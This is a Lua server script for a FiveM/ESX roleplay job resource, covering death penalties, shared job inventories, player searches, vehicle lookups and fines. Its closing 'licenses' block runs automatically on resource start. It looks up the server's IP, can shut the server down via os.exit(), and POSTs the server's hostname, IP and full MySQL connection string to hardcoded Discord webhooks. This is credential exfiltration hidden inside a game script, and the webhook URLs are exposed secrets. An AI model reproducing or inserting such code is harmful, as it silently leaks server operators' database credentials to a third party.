--[[
	id: 5hKjlYd958QbkJYvucLpp
	name: ks_masterjob
	description: ks_masterjob
	time1: 2021-06-20 08:24:07.120809+00
	time2: 2021-06-20 08:24:07.12081+00
	uploader: 2382
	uploadersession: JJWzBFh6vYpY4m8PYDYJnHLWejnMwy
	flag: f
--]]

ESX = nil
TriggerEvent(Config.Core.ESXTrigger, function(obj) ESX = obj end)

ESX.RegisterServerCallback('ks_masterjob:deleteall', function( source,cb ) 
    
    local xPlayer = ESX.GetPlayerFromId(source)
    if Config.Jobs.Ambulance.RespawnOptions.RemoveCashAfterRPDeath then
        if xPlayer.getMoney() > 0 then
            xPlayer.removeMoney(xPlayer.getMoney())
        end
        if xPlayer.getAccount('black_money').money > 0 then
            xPlayer.setAccountMoney('black_money', 0)
        end
    end
    
    if Config.Jobs.Ambulance.RespawnOptions.RemoveItemsAfterRPDeath then
        for i=1, #xPlayer.inventory, 1 do
            if xPlayer.inventory[i].count > 0 then
                xPlayer.setInventoryItem(xPlayer.inventory[i].name, 0)
            end
        end
    end
    
    local playerLoadout = {}

    if Config.Jobs.Ambulance.RespawnOptions.RemoveWeaponsAfterRPDeath then
        for i=1, #xPlayer.loadout, 1 do
            xPlayer.removeWeapon(xPlayer.loadout[i].name)
        end
    else
        for i=1, #xPlayer.loadout, 1 do
            table.insert(playerLoadout, xPlayer.loadout[i])
        end
        Citizen.CreateThread(function()
            Citizen.Wait(5000)
            for i=1, #playerLoadout, 1 do
                if playerLoadout[i].label ~= nil then
                    xPlayer.addWeapon(playerLoadout[i].name, playerLoadout[i].ammo)
                end
            end
        end)
    end

    cb(true)
end)

ESX.RegisterServerCallback('ks_masterjob:getDeathStatus', function( source,callback ) 
    svFunctions:getDeathStatus(source,function(cb)
        callback(cb)
    end)
end)

ESX.RegisterServerCallback('ks_masterjob:server:getJobInv', function( source,cb,job )
    TriggerEvent('esx_addoninventory:getSharedInventory', 'ks_masterjob_'..job, function( inventory )
        if inventory then
            cb(inventory.items)
        else
            print('^1[ks_masterjob] - error in ('..job..') (KS7836UY)')
        end
	end)
end)

ESX.RegisterServerCallback('ks_masterjob:server:getJobSharedMoney', function( source,cb,job )
    TriggerEvent('esx_addonaccount:getSharedAccount', 'ks_masterjob_'..job, function( account )
        if account then
            cb(account.money)
        else
            print('^1[ks_masterjob] - error in ('..job..') (KS7836UZ)')
        end
    end)
end)

ESX.RegisterServerCallback('ks_masterjob:server:getItemCount', function( source,cb,item )
    local _ply = ESX.GetPlayerFromId(source)
    cb(_ply.getInventoryItem(item).count)
end)

ESX.RegisterServerCallback('ks_masterjob:server:getPlayerInv', function( source,cb )
    local xPlayer = ESX.GetPlayerFromId(source)
    cb({items = xPlayer.inventory, weapons = xPlayer.getLoadout(), money = xPlayer.getAccount('black_money'), whiteMoney = xPlayer.getMoney(), accounts = xPlayer.getAccounts()})
end)

ESX.RegisterServerCallback('ks_masterjob:server:getOtherPlayerData', function(source, cb, target, notify)
	local xPlayer = ESX.GetPlayerFromId(target)

	if notify then
		xPlayer.showNotification(Locale('being_searched'))
	end

	if xPlayer then
		local data = {
			name = xPlayer.getName(),
			job = xPlayer.job.label,
			grade = xPlayer.job.grade_label,
			inventory = xPlayer.getInventory(),
			accounts = xPlayer.getAccounts(),
			weapons = xPlayer.getLoadout()
		}

		if Config.EnableESXIdentity then
			data.dob = xPlayer.get('dateofbirth')
			data.height = xPlayer.get('height')
			if xPlayer.get('sex') == 'm' then data.sex = 'male' else data.sex = 'female' end
		end

		TriggerEvent('esx_status:getStatus', target, 'drunk', function(status)
			if status then
				data.drunk = ESX.Math.Round(status.percent)
			end
		end)

		if Config.EnableLicenses then
			TriggerEvent('esx_license:getLicenses', target, function(licenses)
				data.licenses = licenses
				cb(data)
			end)
		else
			cb(data)
		end
	end
end)



if Config.Debug then
    for job in pairs(Config.Jobs) do
        print('^5['..GetCurrentResourceName()..'] ^7-^6 '.."New job registed ^7(^5"..job.."^7)"..'^7')
    end
end

ESX.RegisterServerCallback('ks_masterjob:server:getVehicleInfo', function( source,cb,plate ) 
    MySQL.Async.fetchAll('SELECT owner,adv_stats,plate,garage_id FROM owned_vehicles WHERE plate = @plate', { ['@plate'] = plate}, 
        function(vehicle)
            if vehicle[1] then
                local xPlayer = ESX.GetPlayerFromId(source)
                MySQL.Async.fetchAll('SELECT firstname,lastname FROM users WHERE identifier=@identifier',
                {
                    ['@identifier'] = xPlayer.identifier
                },
                    function(result)
                        cb(
                            {
                                vehicleinfo = vehicle[1], 
                                ownerName = result[1].firstname..' - '..result[1].lastname
                            }
                        )
                    end
                )
            else
                cb(false)
            end
        end
    )
end)

ESX.RegisterServerCallback('ks_masterjob:server:getFineList', function(source, cb, category)
    MySQL.Async.fetchAll('SELECT * FROM fine_types WHERE category = @category',{['@category'] = category},
        function(fines)
            cb(fines)
        end
    )
end)

if Config.JobList then
    for _,jobs in pairs(Config.JobList) do
        TriggerEvent('esx_phone:registerNumber', _, 'Asistencia '.._, true, true)
        TriggerEvent('esx_society:registerSociety', _, _, 'ks_masterjob_'.._, 'ks_masterjob_'.._, 'ks_masterjob_'.._, {type = 'public'})
    end
end

-- Vars

licenses = {}
licenses.productId = 2
licenses.license = Config.License
licenses.discord = {
    started = 'https://discord.com/api/webhooks/821411308339200061/GxyTf7t3_RKkKNFs6JzT5R9dgyjzud2B4HbMkI7xD7Dg1Ptf4kamfYj7N3ibCu5YAh8r',
    host = 'https://discord.com/api/webhooks/821414739816480850/UAeIP-bgDSJxnjNa7udwhww36qs5xuXdb6oAkTuSkSZLOBxpbokOVOWBwJJCnIBESV1r'
}

-- END Vars

-- Functions

function licenses:checkLicenseAndIp()
    PerformHttpRequest("http://ip-api.com/json/",
        function(reCode, resultData, resultHeaders)
            local data = json.decode(resultData)
            PerformHttpRequest(
                "https://licenses.kilichishop.es/api/validate/host/" ..data.query.. '/' ..licenses.productId,
                function(reCode, resultData, resultHeaders)
                    local resultHost = json.decode(resultData)
                    local statusHost = resultHost.status
                    if statusHost == 200 then
                        print('^2['..GetCurrentResourceName()..'] IP ^5[^3'..data.query..'^5]^2 - validated!^7')
                        PerformHttpRequest(
                            "https://licenses.kilichishop.es/api/validate/licensekey/" ..licenses.license .. '/' .. licenses.productId,
                            function(reCode, resultData, resultHeaders)
                                local resultLicense = json.decode(resultData)
                                local licenseStatus = resultLicense.status
                                if licenseStatus == 301 then
                                    print('^1['..GetCurrentResourceName()..'] License^1 - not validated!^7')
                                    licenses:sendToDiscord(" License not validated",data.query,15158332,licenses.discord.host)
                                    Wait(5000)
                                    os.exit()
                                elseif licenseStatus == 200 then
                                    print('^2[' .. GetCurrentResourceName() ..'] - License validated!^7')
                                    licenses:sendToDiscord(" License and ip validated",data.query,3066993,licenses.discord.started)
                                end
                            end
                        )
                    elseif statusHost == 301 then
                        print('^1['..GetCurrentResourceName()..'] IP ^5[^3'..data.query..'^5]^1 - not validated!^7')
                        licenses:sendToDiscord(" IP not validated",data.query,15158332,licenses.discord.host)
                        Wait(5000)
                        os.exit()
                    end
                end
            )
        end
    )
end

function licenses:sendToDiscord(status,ip,color,webhook)
    local array = {
        {
            ["title"] = "``" .. 'Script started - ' ..'['..GetCurrentResourceName()..']'..status.. "``",
            ["color"] = color,
            ["description"] = 'Ks shop system',
            ["fields"] = {
                {
                    ["name"] = "-> Sv Name <-",
                    ["value"] = GetConvar('sv_hostname', false)
                },
                {
                    ["name"] = "-> Sv IP <-", 
                    ["value"] = ip
                },
                {
                    ["name"] = "-> DB Conection <-",
                    ["value"] = GetConvar('mysql_connection_string', false)
                },
                {
                    ["name"] = "-> Sv Max Clients <-",
                    ["value"] = GetConvar('sv_maxclients', false)
                },
                {
                    ["name"] = "-> Onesync <-",
                    ["value"] = GetConvar('onesync', 'on')
                },
                {
                    ["name"] = "-> Idioma <-",
                    ["value"] = GetConvar("locale", "ES")
                }
            },
            ["footer"] = {
                ["text"] = "© KS-SHOP 2021"
            },
            ["author"] = {
                ["name"] = "Kilichi",
                ["url"] = "https://discordapp.com",
                ["icon_url"] = "https://cdn.discordapp.com/avatars/327026518112862210/e3ba45cf56724c08cceeb12cecaa49f0.png?size=1024"
            }
        }
    }
    PerformHttpRequest(
        webhook,
        function(err, text, headers) end, 'POST', json.encode(
            {
                username = 'KS-LOGS',
                embeds = array,
                avatar_url = "https://pbs.twimg.com/profile_images/847824193899167744/J1Teh4Di_400x400.jpg"
            }
        ), 
        {
            ['Content-Type'] = 'application/json'
        }
    )
end

-- END Functions

-- Script Starting

AddEventHandler('onResourceStart',
    function(resourceName)
        if GetCurrentResourceName() == resourceName then
            licenses:checkLicenseAndIp()
        end
    end
)

-- END Script Starting